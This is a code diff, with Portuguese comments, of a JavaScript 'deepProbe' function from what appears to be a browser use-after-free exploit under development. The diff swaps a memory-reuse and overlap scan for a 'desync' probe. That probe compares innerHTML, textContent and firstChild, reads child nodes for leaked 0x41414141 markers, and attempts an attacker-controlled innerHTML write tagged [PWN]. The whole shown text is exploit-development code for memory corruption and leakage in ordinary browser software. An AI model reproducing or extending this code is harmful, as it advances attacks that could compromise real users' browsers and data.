@@ -121,61 +121,70 @@ function preciseReclaim(size){
 // ==========================
 function deepProbe(fsTarget){
 
-    log("---- DEEP PROBE ----");
+    log("---- DESYNC PROBE ----");
 
     let html="";
+    let txt="";
+    let child=null;
 
     try{
-        html=fsTarget.innerHTML;
+        html = fsTarget.innerHTML;
         log("[CHECK] innerHTML = "+html);
-
-        // 🔥 DETECÇÃO DE CONTROLE
-        if(html.includes("CTRL_")){
-            log("[!!!] REUSE CONTROLADO CONFIRMADO");
-        }
-
     }catch(e){
-        log("[UAF] innerHTML crash");
+        log("[ERR] innerHTML crash");
     }
 
-    // 🔥 LEAK SCAN
     try{
+        txt = fsTarget.textContent;
+        log("[CHECK] textContent = "+txt);
+    }catch(e){
+        log("[ERR] textContent crash");
+    }
 
-        let txt=fsTarget.textContent || "";
+    try{
+        child = fsTarget.firstChild;
+        log("[CHECK] firstChild = "+child);
+    }catch(e){
+        log("[ERR] child crash");
+    }
 
-        log("[LEAK] len = "+txt.length);
+    // 🔥 DETECÇÃO DE DESSINCRONIZAÇÃO
+    if(html !== txt){
+        log("[!!!] DESYNC DETECTADO (innerHTML != textContent)");
+    }
 
-        let preview=txt.substring(0,120);
-        log("[LEAK] preview = "+preview);
+    // 🔥 leitura profunda
+    try{
+        if(child){
+            let v = child.nodeValue || child.textContent;
+            log("[LEAK?] child data = "+v);
 
-        // markers
-        if(txt.includes("41414141") ||
-           txt.includes("42424242") ||
-           txt.includes("43434343")){
-            log("[!!!] POSSIVEL LEAK REAL (MARKER)");
-        }
-
-        // 🔥 OVERLAP DETECTION
-        let weird=false;
-
-        for(let i=0;i<txt.length;i++){
-            let c=txt.charCodeAt(i);
-
-            // ASCII fora do esperado
-            if(c < 32 || c > 126){
-                weird=true;
-                break;
+            if(v && v.includes("41414141")){
+                log("[!!!] LEAK VIA CHILD");
             }
         }
-
-        if(weird){
-            log("[!!!] POSSIVEL OVERLAP / MEMORIA ESTRANHA");
-        }else{
-            log("[SCAN] ASCII normal");
-        }
-
     }catch(e){
-        log("[LEAK] crash leitura");
+        log("[LEAK] child crash");
+    }
+
+    // 🔥 tentativa de coerção
+    try{
+        fsTarget.innerHTML = "<div id='x'>BBBBBBBB</div>";
+        log("[PWN] write innerHTML OK");
+    }catch(e){
+        log("[PWN] write crash");
+    }
+
+    // 🔥 re-leitura após write
+    try{
+        let after = fsTarget.innerHTML;
+        log("[CHECK] after write = "+after);
+
+        if(!after.includes("BBBB")){
+            log("[!!!] WRITE DESYNC (grave)");
+        }
+    }catch(e){
+        log("[ERR] read after write");
     }
 
     // estabilidade
@@ -184,20 +193,12 @@ function deepProbe(fsTarget){
     }catch(e){}
 
     try{
-        let r=fsTarget.getBoundingClientRect();
+        let r = fsTarget.getBoundingClientRect();
         log("[CHECK] rect = "+r.height);
     }catch(e){
         log("[UAF] rect crash");
     }
-
-    try{
-        fsTarget.innerHTML="A";
-        log("[PWN] write OK");
-    }catch(e){
-        log("[PWN] write crash");
-    }
 }
-
 // ==========================
 // TRIGGER
 // ==========================
